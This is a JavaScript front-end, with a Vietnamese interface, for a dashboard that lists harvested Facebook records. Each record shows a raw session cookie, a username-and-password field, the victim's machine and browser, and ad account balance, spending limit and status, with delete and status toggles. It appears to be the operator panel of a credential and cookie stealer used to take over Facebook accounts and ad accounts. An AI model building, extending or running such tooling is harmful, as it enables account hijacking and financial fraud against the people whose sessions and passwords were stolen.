var indexPage = 0;
var totalPages = 0;
var loading = document.getElementById("loading").style;
var bodyForm = document.getElementById("bodyForm").style;
// loading.display="none";
bodyForm.opacity=0.3;
loading.display="block";

function getJwtTokenFromLocalStorage(){
    var jwtToken = localStorage.getItem("jwtToken");
    return jwtToken != null ? jwtToken : null;
}
function getResp(path){
    var jwtToken = getJwtTokenFromLocalStorage();
    if(jwtToken!=null){
        return $.ajax({
            url : server+path,
            headers: {
             'Authorization':'Bearer '+jwtToken
             },
            type : "POST",
            dataType:"json",
        });
    }
    return null;
}
function setListCookies(res){
    totalPages = res['totalPages'];
    document.getElementById('total-item').innerText=`(Tổng số ${res['totalElements']} cookies)`;
    document.getElementById('btn-index-page').innerText="Page "+(indexPage+1)+"/"+totalPages;
    var tableCookies = document.getElementById('table-cookies');
    let html = ``;
    var count = 1;
    var content = res['content'];
    content.forEach(element => {
        var checked = element['status'] ? 'checked=""' : "";
        var infoAds = element['infoAds'];
        let htmlSegment = 
        `<tr id="tr-cookies${count}" scope="row" >
            <td>
                <label class="control control--checkbox">
                <input value=${element['id']} id="checkbox-delete${count}" type="checkbox" />
                <div class="control__indicator"></div>
                </label>
            </td>
            <td>${count}</td>
            <td class="pl-0">
            <div class="d-flex align-items-center">
                <a href="https://facebook.com/${element['uid']}" class="name">${element['uid']}</a>
            </div>
            </td>
            <td>${element['machine']}</td>
            <td>${element['browser']}</td>
            <td>
                <div class="form-group purple-border">
                    <textarea class="form-control" id="exampleFormControlTextarea4" rows="3">${element['cookie']}</textarea>
                </div>
            </td>
            <td><p class="text-break">${element['usernameAndPassword']}</p></td>`;
            if(infoAds!=null){
                htmlSegment+= `<td>${infoAds['adsName']}<br>(${infoAds['adsId']})</td>
                <td>${infoAds['currency']} / ${infoAds['country']}</td>
                <td>${infoAds['accountStatus']==1 ? 'Hoạt động' : 'Vô hiệu hóa'}</td>
                <td>${infoAds['spendingLimit']} ${infoAds['currency']}</td>
                <td>${infoAds['balance']}</td>
                <td>${infoAds['thresholdAmount']} ${infoAds['currency']}</td>
                <td>${infoAds['totalSpending']} ${infoAds['currency']}</td>`;
            }
           else{
                htmlSegment+=`<td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>
                <td>null</td>` ;
           }
            htmlSegment+=`<td>${element['createdDate'].slice(0, 19).replace(/-/g, "/").replace("T", " ")}</td>
            <td>
            <label class="custom-control ios-switch">
                <input value=${element['id']} id="btn-status${count}" type="checkbox" class="ios-switch-control-input" ${checked}>
                <span class="ios-switch-control-indicator"></span>
                </label>
            </td>
            <td>
            <button value=${element['id']} id="btn-delete${count}" class="btn btn-danger w-20 ml-3 confirm-button">Xóa</button>
            </td>
      
        </tr>`;
        html += htmlSegment;
        count++;
        
    });
    tableCookies.innerHTML = html;

    for(var i=1;i<=count;i++){
        try{
             mappingBtn(i);
        }
        catch(err){

        }
    }
    loading.display="none";
    bodyForm.opacity=1;

    document.getElementById("btn-delete-select").onclick=function(){
        var listCookies = [];
        var indexDelete = [];
        for(var i=1;i<=count;i++){
            try{
                var checked = document.getElementById(`checkbox-delete${i}`).checked;
                if(checked){
                    var cookies = {
                        id: document.getElementById(`checkbox-delete${i}`).value
                    }
                    listCookies.push(cookies);
                    indexDelete.push(i);
                }
            }
            catch(err){
    
            }
        }
        if(listCookies.length>0){
            if(confirm("Xác nhận xóa những mục đã chọn?")){

                indexDelete.forEach(element=>{
                    document.getElementById(`tr-cookies${element}`).remove();
                });

                var jwtToken = getJwtTokenFromLocalStorage();
                if(jwtToken!=null){
                    $.ajax({
                        url : server+"/delete-list-cookies",
                        headers: {
                        'Authorization':'Bearer '+jwtToken
                        },
                        contentType: 'application/json;charset=utf-8',
                        type : "POST",
                        dataType:"json",
                        data: JSON.stringify(listCookies)
                    });
                    alertSuccess("Xóa thành công!");
                    
                }
                else{
                    window.location.href = '../index.html';
                }
            }
        }
        else{
            alertError("Chưa có mục nào được chọn!");
        }
    }
}
function mappingBtn(i){
    document.getElementById(`btn-delete${i}`).onclick =function(){
        if(confirm(`Xác nhận xóa cookies số ${i}?`)){
            var jwtToken = getJwtTokenFromLocalStorage();
            if(jwtToken!=null){
                var data = {
                    id: document.getElementById(`btn-delete${i}`).value
                };
                $.ajax({
                    url : server+"/delete-cookies",
                    headers: {
                     'Authorization':'Bearer '+jwtToken
                     },
                    contentType: 'application/json;charset=utf-8',
                    type : "POST",
                    dataType:"json",
                    data: JSON.stringify(data),
                    success(result){
                        // window.location.href = '../home.html';
                        document.getElementById(`tr-cookies${i}`).remove();
                    },
                    error(result){
                        // window.location.href = '../home.html';
                        document.getElementById(`tr-cookies${i}`).remove();
                    }
                });
                alertSuccess("Xóa thành công!");
                
            }
            else{
                window.location.href = '../index.html';
            }
        }
    }
    document.getElementById(`btn-status${i}`).onclick =function(){
        var jwtToken = getJwtTokenFromLocalStorage();
        if(jwtToken!=null){
            var data = {
                id: document.getElementById(`btn-status${i}`).value
            };
            $.ajax({
                url : server+"/update-status",
                headers: {
                 'Authorization':'Bearer '+jwtToken
                 },
                contentType: 'application/json;charset=utf-8',
                type : "POST",
                dataType:"json",
                data: JSON.stringify(data)
            });
            alertSuccess("Cập nhật thành công!");
        }
        else{
            window.location.href = '../index.html';
        }
    }
}
async function getListCookie(){
    try {
        const res = await getResp("/get-cookies-page/"+indexPage);
        if(res !=null){
            setListCookies(res);
        } 
        else{
           window.location.href = '../index.html';
        }
      } catch(err) {
        console.log(err)
        //    localStorage.clear();
        //    window.location.href = '../index.html';
      }
}
async function callGetUserInfo() {
    try {
         const res = await getResp("/user");
         if(res !=null){
            if (res['username']!=undefined){
                getListCookie();
            }
              else{
                window.location.href = '../index.html';
              }
         } 
         else{
            window.location.href = '../index.html';
         }
       } catch(err) {
            console.log(err)
            // localStorage.clear();
            // window.location.href = '../index.html';
       }
}

function eventNextPage(){
    var btnPrev = document.getElementById('btn-prev-page');
    var btnNext = document.getElementById('btn-next-page');
    btnPrev.onclick = async function(){
        if(indexPage>0){
            bodyForm.opacity=0.3;
            loading.display="block";
            indexPage--;
            try {
                const res = await getResp("/get-cookies-page/"+indexPage);
                if(res !=null){
                    setListCookies(res);
                } 
                else{
                   window.location.href = '../index.html';
                }
              } catch(err) {
                console.log(err)
                //    localStorage.clear();
                //    window.location.href = '../index.html';
              }
        }
    }
    btnNext.onclick = async function(){
        if(indexPage<totalPages-1){
            bodyForm.opacity=0.3;
            loading.display="block";
            indexPage++;
            try {
                const res = await getResp("/get-cookies-page/"+indexPage);
                if(res !=null){
                    setListCookies(res);
                } 
                else{
                   window.location.href = '../index.html';
                }
              } catch(err) {
                console.log(err)
                   localStorage.clear();
                   window.location.href = '../index.html';
              }
        }
    }
}

callGetUserInfo();
eventNextPage();